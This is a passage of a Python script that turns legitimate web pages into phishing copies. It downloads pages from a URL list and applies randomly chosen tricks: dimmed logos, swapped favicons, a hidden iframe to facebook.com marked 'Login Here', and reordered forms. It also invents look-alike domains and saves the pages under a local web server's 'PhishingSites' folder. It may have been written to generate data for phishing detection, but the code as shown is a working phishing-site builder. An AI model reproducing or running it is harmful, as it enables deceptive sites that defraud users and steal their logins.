    with open(write_file_name, 'w', encoding='utf-8') as f_16_output:
        f_16_output.write(str(function_16_soup))


'''
========================================    PHASE 3 (FUNCTION 16) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 17) BEGINS HERE  =======================================
In this feature we replace the logo with our image keeping the same dimension as specified by developer in the html file
'''


def function_17(target_file, obtained_soup_here):
    print("Adding feature 'Replace logo image'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f17_soup = obtained_soup_here

    for img_tag in f17_soup.find_all('img'):
        if img_tag.has_attr('style'):
            img_tag_present_style = img_tag['style']
            img_tag_additional_styling = img_tag_present_style + "opacity:0.7;"
            img_tag['style'] = img_tag_additional_styling
        else:
            img_tag['style'] = "opacity:0.7;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_17_soup = copy.deepcopy(f17_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_17_output:
        f_17_output.write(str(function_17_soup))


'''
========================================    PHASE 3 (FUNCTION 17) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 18) BEGINS HERE  =======================================
In this feature we replace the favicon in the html file
'''


def function_18(target_file, obtained_soup_here):
    print("Adding feature 'Favicon'")

    replacing_parameter = random.choice([0, 1])
    f18_soup = obtained_soup_here

    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    if replacing_parameter == 0:
        favicon_images = ['https://ssl.gstatic.com/docs/presentations/images/favicon5.ico',
                          'https://storage.googleapis.com/operating-anagram-8280/apple-touch-icon.png',
                          'https://www.youtube.com/s/desktop/5737b328/img/favicon.ico']

        for favicon_item in f18_soup.find_all('link',
                                              attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)}):
            favicon_item['href'] = random.choice(favicon_images)

    if replacing_parameter == 1:
        favicon_link = f18_soup.find("link", rel="icon") or f18_soup.find("link", rel="shortcut icon")

        if favicon_link is not None:
            # get the URL of the favicon
            favicon_url = favicon_link["href"]

            # download the favicon
            response = requests.get(favicon_url)
            with open("favicon.ico", "wb") as f:
                f.write(response.content)

            # make the favicon lighter
            from PIL import Image
            with open("favicon.ico", "rb") as f:
                image = Image.open(f)
                grayscale_image = image.convert("L")
                adjusted_image = Image.eval(grayscale_image, lambda x: x + 50)
                adjusted_image.save("lighter_favicon.ico")

            # update the favicon link tag with the URL of the new lighter favicon
            new_favicon_link = f18_soup.new_tag("link", href="lighter_favicon.ico", rel="icon", type="image/x-icon")
            favicon_link.replace_with(new_favicon_link)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_18_soup = copy.deepcopy(f18_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_18_output:
        f_18_output.write(str(function_18_soup))


'''
========================================    PHASE 3 (FUNCTION 18) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 19) BEGINS HERE  =======================================
In this feature we add the iFrame in the html file
'''


def function_19(target_file, obtained_soup_here):
    print("Adding feature 'IFrame'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f19_soup = obtained_soup_here
    iframe_tag = f19_soup.new_tag('iframe')
    iframe_tag['src'] = "https://facebook.com"
    iframe_tag['style'] = "display:none;"
    iframe_tag.string = 'Login Here'
    f19_soup.html.body.append(iframe_tag)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_19_soup = copy.deepcopy(f19_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_19_output:
        f_19_output.write(str(function_19_soup))


'''
========================================    PHASE 3 (FUNCTION 19) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 20) BEGINS HERE  =======================================
In this feature we swap the position of form and its siblings in the html file
'''


def function_20(target_file, obtained_soup_here):
    print("Adding feature 'Swap Positions'")
    write_file_name = os.path.join(write_file, str(target_file) + ".html")

    f20_soup = obtained_soup_here

    # Find the form tag and its sibling
    found_form = f20_soup.find("form")

    if found_form.find_next_sibling():
        sibling_tag = found_form.find_next_sibling()
        sibling_tag.insert_before(found_form)
    if found_form.find_previous_sibling():
        sibling_tag = found_form.find_previous_sibling()
        sibling_tag.insert_after(found_form)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_20_soup = copy.deepcopy(f20_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_20_output:
        f_20_output.write(str(function_20_soup))


'''
========================================    PHASE 3 (FUNCTION 20) ENDS HERE  ========================================
'''

'''
Read URLs from txt file
'''


def get_URL():
    legitimate_URLs = "Path of file containing legitimate URLS"
    with open(legitimate_URLs, 'r', encoding='utf-8') as f_input:
        URL_List = f_input.readlines()
        my_obtained_legitimate_URLs = []

        for URL in range(len(URL_List)):
            my_obtained_legitimate_URLs.append(URL)
    return URL_List


'''
Read total features to add
'''


def get_total_features():
    Feature_Count_File = "Path of file containing count of features to add"
    with open(Feature_Count_File, 'r', encoding='utf-8') as f_input_features:
        features_to_add = int(f_input_features.read())

    return features_to_add


'''
Add all the features from this main file
'''


def add_features_now():
    """
    Use urllib library to open a URL and get the code and content of the web page
    """

    '''
    PHASE 1: Get the web page source code through URL
    ========================================================================================================================
    '''

    # Get the legitimate URLs list
    target_URL_list = get_URL()
    # print(target_URL_list)
    # print(len(target_URL_list))

    # Get the count of phishing elements to add
    k = get_total_features()

    for i in range(len(target_URL_list)):
        length_of_legitimate_URL = len(target_URL_list[i])
        legitimate_URL = target_URL_list[i][:length_of_legitimate_URL - 1]

        # Request URL to obtain source code using User-Agent
        req = urllib.request.Request(legitimate_URL)
        req.add_header("Cookie", "example_cookie=value")
        user_agent_values = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
        req.add_header("User-Agent", user_agent_values)
        try:
            response = urllib.request.urlopen(req)
        except urllib.error.HTTPError as e:
            print('HTTP Error: {}'.format(e.code))
            continue
        except urllib.error.URLError as e:
            print('URL Error: {}'.format(e.reason))
            continue
        else:
            data = response.read()

            '''
            PHASE 2: copy the web page source code to local .html file
            ========================================================================================================================
            '''
            '''
            Write the content to a file in local to make further modifications
            '''

            file_name = os.path.join(legitimate_sites_folder, str(i) + ".html")
            with open(file_name, 'wb') as f:
                f.write(data)

            '''
            Using webbrowser and os libraries locate the file and open it in the web browser
            '''

            webbrowser.open_new_tab(file_name)

            target_file_name = i

            functions_to_call = []
            with open(file_name, 'rb') as f_input:
                contents = f_input.read()
                soup = BeautifulSoup(contents, 'lxml')

                if soup.find_all('a'):
                    # if 'a_href' or 'a_en_dis' or 'a_dis' or 'a_status' or 'a_ff' or 'a_look_alike' not in functions_to_call:
                    functions_to_call.append('a_href_status_ff')
                    functions_to_call.append('a_dis_button')
                    functions_to_call.append('a_look_alike')
                if soup.find_all('img'):
                    # if 'img' not in functions_to_call:
                    functions_to_call.append('logo_img')
                if soup.find_all('form'):
                    # if 'form' not in functions_to_call:
                    functions_to_call.append('_form_')
                if soup.find_all('h1'):
                    # if 'h1' not in functions_to_call:
                    functions_to_call.append('h1_text')
                if soup.find_all('h2'):
                    # if 'h2' not in functions_to_call:
                    functions_to_call.append('h2_text')
                if soup.find_all('p'):
                    # if 'p' not in functions_to_call:
                    functions_to_call.append('p_text')
            # print(functions_to_call)

            one_out_of_three = [function_1, function_13, function_14]
            all_functions = {'a_href_status_ff': random.choice(one_out_of_three), '_form_': function_8,
                             'a_dis_button': function_11, 'a_look_alike': function_12, 'h1_text': function_16,
                             'h2_text': function_16, 'p_text': function_16,
                             'logo_img': function_17, 'swap_form': function_20}

            function_list = [function_3, function_4, function_5, function_6, function_7, function_9, function_10,
                             function_15, function_18, function_19]
            for key in functions_to_call:
                if key in all_functions:
                    function_list.append(all_functions[key])

            function_list_set = set(function_list)
            new_function_list = list(function_list_set)
            print(new_function_list)

            function_2(target_file_name)
            new_call_list = random.sample(new_function_list, (k - 1))

            domain_name = urlparse(target_URL_list[i]).netloc

            set_of_possible_keywords = ['now.info', 'tech.org', 'tech.net', 'systems.org', 'hub.net', 'store.com',
                                        'connect.com', 'search.net']

            possible_phishing_url = 'http://' + domain_name + '.' + random.choice(set_of_possible_keywords)

            print(possible_phishing_url)

            with open('phishing_urls.txt', 'a', encoding='utf-8') as f_phishing_features:
                f_phishing_features.write(possible_phishing_url)
                f_phishing_features.write("\n")

            write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
            write_file_name = os.path.join("c:" + write_file, str(target_file_name) + ".html")

            with open(write_file_name, 'rb') as file_input:
                file_contents = file_input.read()
                obtained_soup = BeautifulSoup(file_contents, 'lxml')

            new_soup = obtained_soup

            for j in range(len(new_call_list)):
                print("---------------------------------------------")
                new_call_list[j](target_file_name, new_soup)

                with open(write_file_name, 'rb') as file_input_again:
                    file_contents_again = file_input_again.read()
                    new_contents_soup = BeautifulSoup(file_contents_again, 'lxml')
                new_soup = new_contents_soup


if __name__ == '__main__':
    add_features_now()
